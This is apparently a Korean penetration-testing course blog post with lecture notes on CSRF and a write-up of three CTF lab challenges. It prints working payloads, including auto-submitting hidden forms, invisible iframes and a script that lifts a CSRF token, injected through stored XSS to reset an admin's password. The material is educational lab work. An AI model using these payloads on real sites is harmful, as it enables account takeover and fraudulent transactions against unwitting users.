--- meta
title: Penetration Testing | Week 12
date: 2025/07/02
excerpt: Cross Site Request Forgery(CSRF)
categories: 모의 해킹
---

### 강의 노트

#### Cross Site Request Forgery

<strong>Cross Site Request Forgery(CSRF)</strong> 공격은 사용자가 의도하지 않은 요청을 특정 웹 애플리케이션에 전송하도록 만드는 기법이다. 공격자는 사용자가 이미 인증된 세션을 보유하고 있다는 점을 악용하여, 사용자의 권한으로 악의적인 요청을 수행하게 만든다. 이 취약점은 주로 사용자가 로그인한 상태에서 악성 사이트에 접근했을 때 발생한다. 웹 애플리케이션은 해당 요청이 정당한 사용자로부터 온 것으로 인식하고 요청을 처리하며, 사용자는 자신이 모르는 사이에 중요한 작업(계정 정보 변경, 데이터 삭제 등)을 수행하게 된다.

---

#### CSRF 공격 수행 과정(GET 방식)

CSRF 공격을 통해 GET 방식의 요청이 전송되는 과정을 예시와 함께 살펴보자.

어떤 인터넷 뱅킹 서비스의 송금 기능이 `http://bank.com/transfer`라는 주소를 사용하고, 송금 요청 시 수취 계좌와 송금 금액을 각각 `to` 및 `amount`라는 쿼리 문자열 파라미터로 전달하도록 구성되어 있다고 가정해 보자. 이 경우, 일반적인 송금 요청은 `http://bank.com/transfer?to=recipient&amount=10000`과 같은 형식의 URL로 표현될 수 있다.

이때 공격자가 사용자로 하여금 본인 계좌(`attacker`)에게 금전을 송금하도록 유도하고자 할 경우, 사용자가 해당 인터넷 뱅킹 서비스에 로그인된 상태에서 `http://bank.com/transfer?to=attacker&amount=10000`와 같은 주소로 접속하도록 만들기만 하면 된다. 이 URL로의 접속 요청은 사용자가 로그인된 상태에서 전송되므로, 인터넷 뱅킹 서비스의 서버는 해당 요청의 쿠키에 포함된 세션 식별 정보를 통해 이를 정상적인 사용자의 요청으로 인식하게 되며 결과적으로 공격자에게 정상적으로 송금이 이루어질 수 있다.

사용자가 해당 주소로 접근하도록 유도하는 방법은 여러 가지가 있다. 그 중 가장 기본적인 방법은 해당 주소를 하이퍼링크 형태로 전달하는 것이다. 이것만으로도 CSRF 공격이 충분히 효과적으로 수행할 수 있다. 그러나 단순히 링크만을 제공하는 방식은 사용자에게 의심을 유발할 수 있으며, 사용자가 해당 링크에 대한 경계심을 갖고 클릭을 회피할 가능성이 높다. 이러한 한계를 보완하고 공격의 은밀성을 높이기 위해, 보다 정교한 접근 방식이 고려될 수 있다.

가장 효과적인 방식 중 하나는 XSS 취약점과의 연계를 통해 공격을 수행하는 것이다. 이를테면 다음과 같은 스크립트를 취약 지점에 삽입함으로써 사용자의 개입 없이 자동으로 요청이 전송되도록 할 수 있다.

```js
var img = new Image();
img.src = "http://bank.com/transfer?to=attacker&amount=10000";
```

이와 같이 CSRF와 XSS는 상호 보완적인 관계에 있으며 함께 사용될 경우 공격 효과가 극대화될 수 있다.

---

#### CSRF 공격 수행 과정(POST 방식)

CSRF 공격에서 링크를 클릭하거나 이미지의 `src` 속성에 URL을 삽입하는 방식은 서버가 데이터를 수신하는 방식이 POST인 경우 그 사용이 제한된다. 그렇다면 이러한 경우에는 어떻게 CSRF 공격을 수행할 수 있을까?

이때는 반드시 XSS 취약점을 연계하여 공격을 시도해야 하며, 일반적으로 `<form>` 태그를 이용하는 방식이 자주 활용된다. 위의 인터넷 뱅킹 서비스 예시에서 서버가 POST 방식을 사용한다고 가정하고 다음의 예시 코드를 살펴 보자.

```html
<form method="POST" action="http://bank.com/transfer">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <button type="submit">Click This</button>
</form>
```

위의 코드가 삽입된 웹 사이트에서는 `Click This`라는 문구가 쓰인 버튼이 표시된다. 사용자가 이 버튼을 클릭하면 브라우저는 `http://bank.com/transfer`라는 주소로 POST 요청을 전송한다. 이때 `to`와 `amount` 파라미터에는 각각 `attacker`와 `10000`이라는 값이 전달되며, 결과적으로 해당 동작은 GET 방식을 사용하는 서버에 대해 `http://bank.com/transfer?to=attacker&amount=10000`이라는 URL로 접근하는 것과 동일한 작용을 한다.

그러나 사용자가 버튼을 클릭하도록 유도하는 행위는 링크를 전달하는 경우와 마찬가지로 사용자의 경계심을 유발할 수 있다. 따라서 이번에도 사용자의 개입 없이 자동으로 요청이 전송시키는 방식을 고려할 필요가 있다. 다음의 코드를 보자.

```html
<form method="POST" action="http://bank.com/transfer" id="exploit">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>

<script>
  // submit(): <form> 요소를 제출하는 함수
  document.getElementById('exploit').submit();
</script>
```

JavaScript를 함께 삽입하면 사용자가 웹 페이지에 접속하는 즉시 요청이 자동으로 전송되도록 구성할 수 있다. 그러나 이 방식 역시 사용자에게 위화감을 유발할 수 있는 요소가 존재하는데, 바로 `<form>` 태그의 `action` 속성에 의해 양식이 제출된 후 사용자의 브라우저가 `http://bank.com/transfer`이라는 주소로 이동한다는 점이다. 사용자의 입장에서는 관련 없는 웹 페이지에 접속하니 갑작스럽게 인터넷 뱅킹 서비스의 송금 페이지로 리다이렉트되는 현상이 발생하게 되는 것이므로 정황상 의심의 여지가 있다. 이때 `<form>` 태그의 `target` 속성과 `<iframe>` 요소를 활용하면, 보다 정교한 공격 시나리오를 구성할 수 있다. 다음의 코드를 보자.

```html
<iframe name="secret" style="display: none;"></iframe>

<form method="POST" action="http://bank.com/transfer" id="exploit" target="secret">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>

<script>
  document.getElementById('exploit').submit();
</script>
```

`<form>` 태그의 `target` 속성은 양식 제출 후 서버로부터 응답받은 페이지가 어디에 표시될지를 지정하는 속성이다. 기본값은 현재 창이며, 만약 `<iframe>`의 `name` 속성 값을 지정할 경우 응답 페이지는 해당 프레임 내에서 표시된다. 따라서 `<iframe>` 요소를 추가하고 `form` 태그의 `target` 속성에 해당 프레임을 지정한 후, `display: none;`과 같은 스타일을 적용하여 보이지 않도록 처리하면 사용자가 요청이 전송되었다는 사실을 인지하지 못하도록 구현할 수 있다.

정리하면, CSRF 공격을 수행하는 공격자는 `XSS` 취약점을 기반으로 `form` 태그를 활용하여 POST 방식의 요청 또한 전송할 수 있다.

---

#### CSRF 토큰

CSRF 토큰이란 사용자가 특정 페이지에 접속하였을 때 서버가 발급하는 랜덤한 문자열을 말한다. 로그인 등을 통해 사용자가 인증된 세션을 보유하게 되면 서버는 세션을 기반으로 고유한 토큰을 생성해 웹 페이지에 함께 포함시킨다. 주로 서버로의 데이터 전송이 이루어지는 `<form>` 태그 안에 포함되는 경우가 많다.

사용자가 서버에 요청을 보내는 작업(양식 제출 등)을 수행하면 CSRF 토큰이 함께 전송된다. 앞선 인터넷 뱅킹 서비스의 예시를 참고하면, URL을 `http://bank.com/transfer?to=recipient&amount=10000&csrfToken=q1w2e3r4` 같은 형태로 나타낼 수 있다. 이때 서버는 전송받은 토큰을 검증하여 유효한 요청인지 확인하고, 토큰이 없거나 일치하지 않는 경우 요청은 거부된다. 공격자는 유효한 CSRF 토큰을 알 수 없기 때문에, 사용자의 권한을 도용한 요청을 보내는 것이 어려워진다.

<br>
<br>
<br>

### 과제

#### CSRF CTF

![CSRF CTF](/data/Penetration%20Testing%20%7C%20Week%2012/1.png)

CTF를 해결하며 CSRF 공격을 실습해 보자.

<br>

##### GET Admin 1

<img src="/data/Penetration%20Testing%20%7C%20Week%2012/2.png" alt="GET Admin 1" style="padding: 0 200px; background-color: white;">

링크의 주소로 접속하면 회원제 게시판 애플리케이션으로 이동한다.

회원 가입을 진행하여 `any`/`any` 계정을 생성하고, 로그인 후 계정 정보가 포함된 마이페이지로 이동하였다.

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/3.png)

마이페이지에는 비밀번호 변경 기능을 제공한다. 따라서 기본적으로 생각해 볼 수 있는 전략은, 비밀번호를 변경하는 URL을 관리자에게 링크로 전달하여 관리자 계정의 비밀번호를 획득하는 것이다. 그러기 위해서는 서버가 GET 방식의 요청을 허용하고 있어야 하므로, Burp Suite를 통해 비밀번호 변경 요청을 자세히 분석해 보았다.

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/4.png)
![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/5.png)

비밀번호를 `any0`으로 변경한 후 요청을 확인해 보니, 기본적으로 POST 방식으로 데이터가 전달됨을 알 수 있었다. 하지만 요청 방식을 GET 방식으로 수정하여 전송해도 정상적으로 응답이 반환됨을 확인하였다.

이때 전송 데이터에는 CSRF 토큰과 같은 별도의 인증 정보가 포함되지 않으므로 요청 URL을 그대로 관리자에게 전달하면 관리자 계정의 비밀번호를 강제로 변경시킬 수 있다. 따라서 관리자 visit Bot 페이지로 이동하여 비밀번호를 `any`로 변경하는 URL을 전달해 보았다.

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/6.png)

그 결과 관리자가 알아차렸다는 메시지가 출력되었다. 이에 대해 고민해 본 결과, 서버 측 응답에서 그 이유를 파악할 수 있었다.

<img src="/data/Penetration%20Testing%20%7C%20Week%2012/7.png" alt="GET Admin 1" style="padding: 0 100px; background-color: #2b2b2b;">

비밀번호를 변경한 후 사용자의 브라우저에는 회원 정보 수정에 성공했다는 내용의 알림 창이 표시된다. 관리자 visit Bot이 전달받은 URL로 접속하면 동일하게 알림 창이 표시될 것이고, 따라서 비정상적인 동작이 이루어졌다는 것을 짐작할 수 있는 것이다.

이를 해결하기 위해 XSS 취약점과 연계한 공격을 활용하기로 결정하고 취약점을 탐색해 보았다.

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/8.png)

게시물 작성 페이지에서 특수 문자가 별도 변환 처리 없이 그대로 서버로 전송됨을 확인하였다. `<script>` 태그 역시 마찬가지로 사용 가능한 것을 확인한 후, 다음과 같이 페이로드를 작성하였다.

```html
<script>
  var img = new Image();
  img.src = "http://ctf.segfaulthub.com:7575/csrf_1/mypage_update.php?id=&info=&pw=any"
</script>
```

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/9.png)

페이로드를 삽입하여 게시물을 작성한 후 열람하면 서버 응답에 스크립트가 정상적으로 포함되는 것을 확인하였고, 해당 게시물 열람 페이지의 URL을 관리자 visit Bot에게 전달하였다.

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/10.png)

별도의 오류 없이 관리자가 접속했다는 메시지가 출력되었다. 이에 따라 관리자 계정의 비밀번호가 `any`로 변경되었을 것이므로, 로그인 페이지로 이동하여 `any_admin`/`any`를 입력하여 로그인을 시도하였다.

![GET Admin 1](/data/Penetration%20Testing%20%7C%20Week%2012/11.png)

로그인에 성공하여 알림 창에 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">csrfEEASY?</span>}</span></p>

<br>

##### GET Admin 2

<img src="/data/Penetration%20Testing%20%7C%20Week%2012/12.png" alt="GET Admin 2" style="padding: 0 200px; background-color: white;">

링크의 주소로 접속하여 `any`/`any` 계정을 생성해 로그인한 후, 마이페이지에서 비밀번호를 변경해 보았다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/13.png)
![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/14.png)

이번에는 서버가 POST 방식의 요청만을 허용하고 있다는 사실을 알 수 있었다. 따라서 `<form>` 태그를 통한 공격을 활용하기로 결정하고 XSS 취약점을 탐색해 보았다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/15.png)

GET Admin 1과 동일한 위치에서 XSS 취약점을 발견하였다. 이후 다음과 같이 페이로드를 작성하였다.

```html
<iframe name="secret" style="display: none;"></iframe>

<form method="POST" action="http://ctf.segfaulthub.com:7575/csrf_2/mypage_update.php"
 id="exploit" target="secret">
  <input type="hidden" name="id" value="">
  <input type="hidden" name="info" value="">
  <input type="hidden" name="pw" value="any">
</form>

<script>
  document.getElementById('exploit').submit();
</script>
```

페이로드를 삽입하여 게시물을 작성한 후 열람하자 예상치 못한 동작을 확인하였다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/16.png)

현재 창에서 회원 정보를 수정했다는 내용의 알림 창이 표시되었다. 해당 알림 창이 `<iframe>` 요소 내에 표시되어 보이지 않을 것으로 예상되었으나, `alert()` 함수는 항상 현재 창을 기준으로 알림 창이 표시되는 듯했다. 따라서 알림 창이 표시되지 않게 하기 위한 방법을 조사해 보았다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/17.png)

HTML 공식 문서를 통해 해결책을 찾을 수 있었다. `<iframe>` 태그에 `sandbox` 속성을 사용하면 보안을 위해 다양한 종류의 제한 사항을 적용하는데, 이 중 스크립트 실행 차단 역시 포함되어 있다. 즉, `alert()` 함수의 실행이 원천적으로 차단된다는 의미이다. 따라서 작성한 페이로드의 `<iframe>` 태그에 `sandbox` 속성을 추가한 후 다시 게시물을 생성하여 열람해 보았다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/18.png)
![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/19.png)

비밀번호 변경 요청이 정상적으로 전송되고 서버 응답에 `alert()` 함수가 포함되었으나, 게시물 열람 페이지의 `<iframe>` 요소에서 스크립트 실행이 차단되어 알림 창이 표시되지 않음을 확인하였다. 이후 해당 페이지의 URL을 관리자 visit Bot에게 전달하였다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/20.png)

별도의 오류 없이 관리자가 접속했다는 메시지가 출력되었다. 이에 따라 관리자 계정의 비밀번호가 `any`로 변경되었을 것이므로, 로그인 페이지로 이동하여 `any_admin`/`any`를 입력하여 로그인을 시도하였다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/21.png)

로그인에 성공하여 알림 창에 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">postCSRFkkk</span>}</span></p>

<br>

##### GET Admin 3

<img src="/data/Penetration%20Testing%20%7C%20Week%2012/22.png" alt="GET Admin 3" style="padding: 0 200px; background-color: white;">

링크의 주소로 접속하여 `any`/`any` 계정을 생성해 로그인한 후, 마이페이지에서 비밀번호를 변경해 보았다.

![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/23.png)
![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/24.png)
![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/25.png)

이번에는 CSRF 토큰이 사용되고 있으며, 마찬가지로 POST 방식의 요청만이 허용됨을 알 수 있었다. 따라서 비밀번호 변경 요청을 서버에 전송시키기 위해서는 관리자의 CSRF 토큰을 탈취하는 과정이 선행되어야 한다. 이를 위해선 JavaScript의 사용이 필수적이므로, 우선 XSS 취약점을 탐색해 보았다.

![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/26.png)

GET Admin 1, 2와 마찬가지로 게시물 작성 페이지에서 XSS 취약점을 발견하였다. 다음으로 CSRF 토큰을 탈취하고 서버에 비밀번호 변경 요청을 전송하기 위해 페이로드를 작성하였다.

```html
<iframe id="mypage" src="http://ctf.segfaulthub.com:7575/csrf_3/mypage.php"
 style="display: none;"></iframe>

<iframe name="secret" style="display: none;" sandbox></iframe>

<form method="POST" action="http://ctf.segfaulthub.com:7575/csrf_3/mypage_update.php"
 id="exploit" target="secret">
  <input type="hidden" name="id" value="">
  <input type="hidden" name="info" value="">
  <input type="hidden" name="pw" value="any">
  <input type="hidden" name="csrf_token">
</form>

<script>
  var tokenIssuer = document.getElementById('mypage');
  tokenIssuer.onload = function() {
    var tokenIssuerDoc = tokenIssuer.contentDocument;
    var csrfToken = tokenIssuerDoc.getElementsByName('csrf_token')[0].value;

    document.getElementsByName('csrf_token')[0].value = csrfToken;
    document.getElementById('exploit').submit();
  }
</script>
```

우선 `<iframe>` 요소 내에 마이페이지를 로드한 후, 발급되는 CSRF 토큰의 값을 획득한다. 이후 `<form>` 태그를 활용해 비밀번호 변경 요청을 전송하며, 이때 마이페이지에서 획득한 CSRF 토큰의 값을 함께 전달한다.

![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/27.png)
![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/28.png)

페이로드를 삽입하여 게시물을 작성한 후 열람하면 서버 응답에 스크립트가 정상적으로 포함되는 것을 확인하였고, CSRF 토큰을 포함한 비밀번호 변경 요청이 전송되는 것을 확인하였다. 이후 해당 게시물 열람 페이지의 URL을 관리자 visit Bot에게 전달하였다.

![GET Admin 3](/data/Penetration%20Testing%20%7C%20Week%2012/29.png)

별도의 오류 없이 관리자가 접속했다는 메시지가 출력되었다. 이에 따라 관리자 계정의 비밀번호가 `any`로 변경되었을 것이므로, 로그인 페이지로 이동하여 `any_admin`/`any`를 입력하여 로그인을 시도하였다.

![GET Admin 2](/data/Penetration%20Testing%20%7C%20Week%2012/30.png)

로그인에 성공하여 알림 창에 플래그가 출력되었다.

<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">csrfTokenByp4ss</span>}</span></p>